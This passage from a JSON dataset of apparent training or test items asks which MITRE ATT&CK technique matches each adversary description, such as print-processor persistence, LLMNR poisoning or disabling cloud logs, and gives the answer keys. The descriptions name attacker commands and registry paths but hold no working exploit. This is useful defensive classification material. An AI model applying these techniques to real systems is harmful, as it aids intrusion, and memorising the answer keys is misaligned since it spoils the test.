    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.\n\nA. Trusted Developer Utilities Proxy Execution, B. Domain or Tenant Policy Modification: Trust Modification, C. System Owner/User Discovery, D. Software Discovery: Security Software Discovery\nAnswer:",
    "context": "",
    "output": "C. System Owner/User Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from The technique during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "options": "A. Trusted Developer Utilities Proxy Execution, B. Domain or Tenant Policy Modification: Trust Modification, C. System Owner/User Discovery, D. Software Discovery: Security Software Discovery",
      "choice": "C. System Owner/User Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).\nA. Hide Artifacts: Hidden Files and Directories, B. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, C. Impair Defenses: Disable or Modify Tools, D. Gather Victim Host Information\nAnswer:",
    "context": "",
    "output": "D. Gather Victim Host Information",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via Active Scanning or Phishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: Social Media or Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Supply Chain Compromise or External Remote Services).",
      "options": "A. Hide Artifacts: Hidden Files and Directories, B. Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, C. Impair Defenses: Disable or Modify Tools, D. Gather Victim Host Information",
      "choice": "D. Gather Victim Host Information",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\CurrentControlSet or ControlSet001\\Control\\Print\\Environments\\\\Windows architecture: e.g., Windows x64\\Print Processors\\\\user defined\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.\nA. Phishing for Information: Spearphishing Attachment, B. System Binary Proxy Execution: Control Panel, C. System Network Connections Discovery, D. Boot or Logon Autostart Execution: Print Processors\nAnswer:",
    "context": "",
    "output": "D. Boot or Logon Autostart Execution: Print Processors",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.\n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\CurrentControlSet or ControlSet001\\Control\\Print\\Environments\\\\Windows architecture: e.g., Windows x64\\Print Processors\\\\user defined\\Driver</code> Registry key that points to the DLL.\n\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.\n\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",
      "options": "A. Phishing for Information: Spearphishing Attachment, B. System Binary Proxy Execution: Control Panel, C. System Network Connections Discovery, D. Boot or Logon Autostart Execution: Print Processors",
      "choice": "D. Boot or Logon Autostart Execution: Print Processors",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.\nA. Hijack Execution Flow: Path Interception by PATH Environment Variable, B. Data Obfuscation: Junk Data, C. System Services: Service Execution, D. Indicator Removal: File Deletion\nAnswer:",
    "context": "",
    "output": "C. System Services: Service Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services. The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and Net.\n\nPsExec can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API. Tools such as PsExec and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with Windows Service during service persistence or privilege escalation.",
      "options": "A. Hijack Execution Flow: Path Interception by PATH Environment Variable, B. Data Obfuscation: Junk Data, C. System Services: Service Execution, D. Indicator Removal: File Deletion",
      "choice": "C. System Services: Service Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies. \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user\u2019s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.\n\nPossible answers:\nA. Boot or Logon Autostart Execution: Re-opened Applications, B. Ingress Tool Transfer, C. Masquerading: Double File Extension, D. Unused/Unsupported Cloud Regions",
    "context": "",
    "output": "C. Masquerading: Double File Extension",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system\u2019s policies. \n\nAdversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain Initial Access into a user\u2019s system via Spearphishing Attachment then User Execution. For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.\n\nCommon file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
      "options": "A. Boot or Logon Autostart Execution: Re-opened Applications, B. Ingress Tool Transfer, C. Masquerading: Double File Extension, D. Unused/Unsupported Cloud Regions",
      "choice": "C. Masquerading: Double File Extension",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise.\n\nPossible answers:\nA. Defacement: External Defacement, B. Use Alternate Authentication Material, C. Browser Information Discovery, D. Gather Victim Network Information: Network Topology",
    "context": "",
    "output": "A. Defacement: External Defacement",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAn adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise.",
      "options": "A. Defacement: External Defacement, B. Use Alternate Authentication Material, C. Browser Information Discovery, D. Gather Victim Network Information: Network Topology",
      "choice": "A. Defacement: External Defacement",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.\n\nPossible answers:\nA. Compromise Infrastructure: Web Services, B. Command and Scripting Interpreter: JavaScript, C. Create or Modify System Process: Launch Daemon, D. Browser Extensions",
    "context": "",
    "output": "C. Create or Modify System Process: Launch Daemon",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\n\nAdversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\n\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.",
      "options": "A. Compromise Infrastructure: Web Services, B. Command and Scripting Interpreter: JavaScript, C. Create or Modify System Process: Launch Daemon, D. Browser Extensions",
      "choice": "C. Create or Modify System Process: Launch Daemon",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nBy responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. \n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\u00a0\n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.\nA. System Binary Proxy Execution: Msiexec, B. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, C. Inter-Process Communication: XPC Services, D. Pre-OS Boot: Component Firmware",
    "context": "",
    "output": "B. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nBy responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. \n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\u00a0\n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.",
      "options": "A. System Binary Proxy Execution: Msiexec, B. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, C. Inter-Process Communication: XPC Services, D. Pre-OS Boot: Component Firmware",
      "choice": "B. Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).\nA. Search Open Technical Databases: Digital Certificates, B. Modify Cloud Compute Infrastructure: Revert Cloud Instance, C. Compromise Accounts, D. Obfuscated Files or Information: Dynamic API Resolution",
    "context": "",
    "output": "D. Obfuscated Files or Information: Dynamic API Resolution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions.\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as `GetProcAddress()` and `LoadLibrary()`. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution).",
      "options": "A. Search Open Technical Databases: Digital Certificates, B. Modify Cloud Compute Infrastructure: Revert Cloud Instance, C. Compromise Accounts, D. Obfuscated Files or Information: Dynamic API Resolution",
      "choice": "D. Obfuscated Files or Information: Dynamic API Resolution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).\n\nPossible answers:\nA. Web Service, B. Boot or Logon Autostart Execution: Security Support Provider, C. Indicator Removal: Clear Windows Event Logs, D. Encrypted Channel: Symmetric Cryptography",
    "context": "",
    "output": "A. Web Service",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "options": "A. Web Service, B. Boot or Logon Autostart Execution: Security Support Provider, C. Indicator Removal: Clear Windows Event Logs, D. Encrypted Channel: Symmetric Cryptography",
      "choice": "A. Web Service",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.  Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.\n\nA. Scheduled Task/Job: Container Orchestration Job, B. Modify Authentication Process: Network Provider DLL, C. Create or Modify System Process: Launch Agent, D. Implant Internal Image\nAnswer:",
    "context": "",
    "output": "C. Create or Modify System Process: Launch Agent",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.  Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time. Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.\n\n Launch Agents can also be executed using the Launchctl command.\n \nAdversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>. The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.",
      "options": "A. Scheduled Task/Job: Container Orchestration Job, B. Modify Authentication Process: Network Provider DLL, C. Create or Modify System Process: Launch Agent, D. Implant Internal Image",
      "choice": "C. Create or Modify System Process: Launch Agent",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.\n\nOptions:\nA. Boot or Logon Initialization Scripts: Login Hook, B. Data from Configuration Repository: Network Device Configuration Dump, C. Acquire Infrastructure: Server, D. Application Window Discovery",
    "context": "",
    "output": "D. Application Window Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\n\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
      "options": "A. Boot or Logon Initialization Scripts: Login Hook, B. Data from Configuration Repository: Network Device Configuration Dump, C. Acquire Infrastructure: Server, D. Application Window Discovery",
      "choice": "D. Application Window Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAn adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.\nA. Input Capture: Credential API Hooking, B. Modify Cloud Compute Infrastructure: Create Cloud Instance, C. Exfiltration Over Web Service: Exfiltration Over Webhook, D. Impair Defenses: Disable or Modify Cloud Logs\nAnswer:",
    "context": "",
    "output": "D. Impair Defenses: Disable or Modify Cloud Logs",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAn adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.",
      "options": "A. Input Capture: Credential API Hooking, B. Modify Cloud Compute Infrastructure: Create Cloud Instance, C. Exfiltration Over Web Service: Exfiltration Over Webhook, D. Impair Defenses: Disable or Modify Cloud Logs",
      "choice": "D. Impair Defenses: Disable or Modify Cloud Logs",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
